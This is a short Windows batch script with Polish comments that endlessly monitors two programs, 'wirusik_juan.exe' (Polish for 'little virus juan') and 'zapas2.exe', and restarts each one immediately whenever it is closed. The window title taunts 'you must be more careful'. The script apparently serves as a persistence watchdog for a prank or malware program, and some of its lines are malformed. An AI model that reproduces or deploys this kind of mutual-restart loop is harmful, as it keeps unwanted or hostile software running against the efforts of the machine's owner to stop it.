@echo off
	title you must be more careful
setlocal enabledelayedexpansion

rem Nazwa procesu do monitorowania (Program A)
set "processName=wirusik_juan.exe"
set "processName2=zapas2.exe"

rem Œcie¿ka do programu A
set \"programPath=\""\"

rem Funkcja sprawdzaj¹ca czy proces jest uruchomiony
:checkProcess
tasklist /FI "IMAGENAME eq %processName%" 2>NUL | find /I "%processName%" >NUL

rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
if "%ERRORLEVEL%"=="0" (
    rem echo %processName% jest uruchomiony
    timeout /t 0 /nobreak >NUL
    goto checkProcesstwo
) else (
    rem echo %processName% nie jest uruchomiony
    rem Uruchom program ponownie
    //start "" "%programPath%"
    start "" "wirusik_juan.exe"
    timeout /t 0 /nobreak >NUL
    goto checkProcesstwo
)
:checkProcesstwo
tasklist /FI "IMAGENAME eq %processName2%" 2>NUL | find /I "%processName2%" >NUL

rem Je¿eli proces jest uruchomiony, odczekaj i sprawdŸ ponownie
if "%ERRORLEVEL%"=="0" (
    rem echo %processName2% jest uruchomiony
    timeout /t 0 /nobreak >NUL
    goto checkProcess
) else (
    rem echo %processName2% nie jest uruchomiony
    rem Uruchom program ponownie
    //start "" "%programPath%"
    start "" "zapas2.exe"
    timeout /t 0 /nobreak >NUL
    goto checkProcess
)

rem echo Monitoring zakoñczony.
pause